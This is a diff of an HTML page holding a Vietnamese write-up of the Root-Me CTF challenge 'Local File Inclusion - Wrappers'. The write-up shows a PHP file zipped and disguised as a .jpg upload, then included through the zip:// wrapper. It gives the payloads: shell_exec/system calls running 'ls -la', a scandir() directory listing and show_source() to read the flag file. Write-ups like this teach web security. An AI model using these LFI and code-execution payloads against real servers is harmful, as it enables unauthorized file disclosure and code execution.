@@ -170,53 +170,60 @@
 
                 <div id="content" class="content">
                     <main>
-                        <h1 id="write-up"><a class="header" href="#write-up">WRITE UP</a></h1>
-<p><strong>Challenge:</strong> <a href="https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion-Wrappers">Local File Inclusion - Wrappers</a></p>
-<img src="./media/image1.png" style="width:6.5in;height:1.38125in" alt="Graphical user interface, text, application, website Description automatically generated" />
+                        <h1 id="local-file-inclusion---wrappers"><a class="header" href="#local-file-inclusion---wrappers"><a href="https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion-Wrappers">Local File Inclusion - Wrappers</a></a></h1>
+<p><img src="./media/image1.png" alt="" /></p>
 <p>Khi thử upload without source, ta nhận được message:</p>
-<p><em>"Sorry, only JPG images will be accepted. Please use a different service if you do not intend to upload pictures”</em></p>
-<p>Đề bài gợi ý là Wrapper, ta chú ý đến PHP Wrapper. Dó đó thử dụng php://filter để get source index.php nhưng không khả thi:</p>
-<p><img src="./media/image2.png" style="width:6.5in;height:1.52778in" alt="Graphical user interface, text, application, website Description automatically generated" /> Sử dụng data wrapper thì bị nhận diện attack còn sử dụng encode base64 thì nhận được lỗi “page name too long”:</p>
-<img src="./media/image3.png" style="width:6.5in;height:1.76597in" alt="Graphical user interface, text, application, Word Description automatically generated" />
-<img src="./media/image4.png" style="width:6.5in;height:1.54514in" alt="Graphical user interface, text, application, Word Description automatically generated" />
+<blockquote>
+<p>"Sorry, only JPG images will be accepted. Please use a different service if you do not intend to upload pictures”</p>
+</blockquote>
+<p>Đề bài gợi ý là Wrapper, ta chú ý đến PHP Wrapper. Dó đó thử dụng <code>php://filter</code> để get source <strong>index.php</strong> nhưng không khả thi:</p>
+<p><img src="./media/image2.png" alt="" /></p>
+<p>Sử dụng data wrapper thì bị nhận diện attack còn sử dụng encode base64 thì nhận được lỗi <strong>“page name too long”</strong>:</p>
+<p><img src="./media/image3.png" alt="" /></p>
+<p><img src="./media/image4.png" alt="" /></p>
 <p>Đến đây, chắc có lẽ ta cần sử dụng cổng upload này để upload command lên server, sau đó, dùng wrapper để chạy file. Ta sử dụng đến wrapper <strong>zip://</strong> để đọc file từ zip vì có lẽ server chặn các cổng data mất rồi:</p>
-<p><strong>Code getsource.php:</strong></p>
-<p>&lt;pre&gt;&lt;?php show_source('index.php'); ?&gt;&lt;/pre&gt;;</p>
-<p>Ta đặt tên là getsource.php, sau đó zip file lại getsource.zip, rename getsource.jpg , sau đó upload lên server:</p>
-<img src="./media/image5.png" style="width:6.5in;height:1.94236in" alt="Graphical user interface, text, application, website Description automatically generated" />
+<p>Code <code>getsource.php</code>:</p>
+<pre><code class="language-html">&lt;pre&gt;&lt;?php show_source('index.php'); ?&gt;&lt;/pre&gt;;
+</code></pre>
+<p>Ta đặt tên là <strong>getsource.php</strong>, sau đó zip file lại <strong>getsource.zip</strong>, rename <strong>getsource.jpg</strong> , sau đó upload lên server:</p>
+<p><img src="./media/image5.png" alt="" /></p>
 <p>Chú ý đến cấu trúc URL: <a href="http://challenge01.root-me.org/web-serveur/ch43/index.php?page=view&amp;id=8Gjbt40un">http://challenge01.root-me.org/web-serveur/ch43/index.php?page=view&amp;id=8Gjbt40un</a></p>
-<p>Lúc này, page đang load một filename có id là <strong>8Gjbt40un</strong> khác với image name của ta Server đã upload lên /tmp/upload/image_id.jpg. Sử dụng zip wrapper tuy cập đến <strong>/tmp/upload/8Gjbt40un.jpg%23getsource,</strong> server sẽ tự concat thêm ‘.php’ cho ta để có câu request hoàn chỉnh:</p>
+<p>Lúc này, page đang load một filename có id là <strong>8Gjbt40un</strong> khác với image name của ta Server đã upload lên <code>/tmp/upload/image_id.jpg</code>. Sử dụng zip wrapper tuy cập đến <strong>/tmp/upload/8Gjbt40un.jpg%23getsource</strong>, server sẽ tự concat thêm ‘.php’ cho ta để có câu request hoàn chỉnh:</p>
 <p><em>?page=zip://tmp/upload/8Gjbt40un.jpg%23getsource</em>*.php***</p>
-<img src="./media/image6.png" style="width:6.5in;height:1.77639in" alt="Graphical user interface, text, application Description automatically generated" />
+<p><img src="./media/image6.png" alt="" /></p>
 <p>Tuy nhiên, ta lại nhận được lỗi tên quá dài. Ta cần rename lại thành t.php t.zip t.jpg, sau đó upload lại:</p>
-<img src="./media/image7.png" style="width:6.5in;height:1.93611in" alt="Graphical user interface, text, application, website Description automatically generated" />
+<p><img src="./media/image7.png" alt="" /></p>
 <p><em><strong>Payload:</strong> ?page=zip://tmp/upload/XoMA4xJDj.jpg%23</em><em>t.php</em>**</p>
-<img src="./media/image8.png" style="width:6.5in;height:3.85256in" alt="Graphical user interface, text, application Description automatically generated" />
+<p><img src="./media/image8.png" alt="" /></p>
 <p>Source không có thông tin gì liên quan đến password cả, giờ thì ta phải thử tìm trong folder chứ index.php vì có thể sẽ có file khác nhưng ta không Path Traversal đc:</p>
-<p><strong>Payload:</strong> <em>&lt;pre&gt;&lt;?php shell_exec('ls -la') ?&gt;&lt;/pre&gt;;</em></p>
-<img src="./media/image9.png" style="width:6.5in;height:2.02153in" alt="Graphical user interface, text, application Description automatically generated" />
-<p>shell_exec() bị block. Ta thử với:</p>
-<p><strong>Payload:</strong> <em>&lt;pre&gt;&lt;?php system('ls -la') ?&gt;&lt;/pre&gt;;</em></p>
-<img src="./media/image10.png" style="width:6.5in;height:2.03264in" alt="Graphical user interface, text, application, website Description automatically generated" />
-<p>system() cũng bị block. Ta thử với exec() nhưng cũng bị block:</p>
-<img src="./media/image11.png" style="width:6.5in;height:1.81528in" alt="Graphical user interface, text, application Description automatically generated" />
-<p>Không còn cách nào khác, ta sử dụng scandir() để list all file trong director:</p>
-<p><em>&lt;pre&gt;</em></p>
-<p><em>&lt;?php</em></p>
-<p><em>$path = './';</em></p>
-<p><em>$files = scandir($path);</em></p>
-<p><em>foreach($files as $file) {</em></p>
-<p><em>echo "&lt;a href='$file'&gt;$file&lt;/a&gt;";</em></p>
-<p><em>}</em></p>
-<p><em>?&gt;</em></p>
-<p><em>&lt;/pre&gt;;</em></p>
+<p><strong>Payload:</strong> <code>&lt;pre&gt;&lt;?php shell_exec('ls -la') ?&gt;&lt;/pre&gt;;</code></p>
+<p><img src="./media/image9.png" alt="" /></p>
+<p><code>shell_exec()</code> bị block. Ta thử với:</p>
+<p><strong>Payload:</strong> <code>&lt;pre&gt;&lt;?php system('ls -la') ?&gt;&lt;/pre&gt;;</code></p>
+<p><img src="./media/image10.png" alt="" /></p>
+<p><code>system()</code> cũng bị block. Ta thử với <code>exec()</code> nhưng cũng bị block:</p>
+<p><img src="./media/image11.png" alt="" /></p>
+<p>Không còn cách nào khác, ta sử dụng <code>scandir()</code> để list all file trong director:</p>
+<pre><code class="language-php">&lt;pre&gt;
+&lt;?php
+$path = './';
+$files = scandir($path);
+
+foreach($files as $file) {
+    echo "&lt;a href='$file'&gt;$file&lt;/a&gt;";
+}
+?&gt;
+&lt;/pre&gt;;
+</code></pre>
 <p>Xong, nó list all ra được và ta có thể thấy được flag:</p>
-<img src="./media/image12.png" style="width:6.5in;height:1.49028in" alt="Graphical user interface, text, application, email Description automatically generated" />
+<p><img src="./media/image12.png" alt="" /></p>
 <p>Đọc file flag với:</p>
-<p><em>&lt;pre&gt;&lt;?php show_source('flag-mipkBswUppqwXlq9ZydO.php'); ?&gt;&lt;/pre&gt;;</em></p>
-<img src="./media/image13.png" style="width:6.5in;height:2.24444in" alt="Graphical user interface, text, application, website Description automatically generated" />
-<img src="./media/image14.png" style="width:6.5in;height:4.05208in" alt="A screenshot of a computer Description automatically generated with medium confidence" />
-<p>- Flag: *****************************</p>
+<p><code>&lt;pre&gt;&lt;?php show\_source('flag-mipkBswUppqwXlq9ZydO.php'); ?&gt;&lt;/pre&gt;;</code></p>
+<p><img src="./media/image13.png" alt="" /></p>
+<p><img src="./media/image14.png" alt="" /></p>
+<ul>
+<li>Flag: "****************************"</li>
+</ul>
 
                     </main>
 
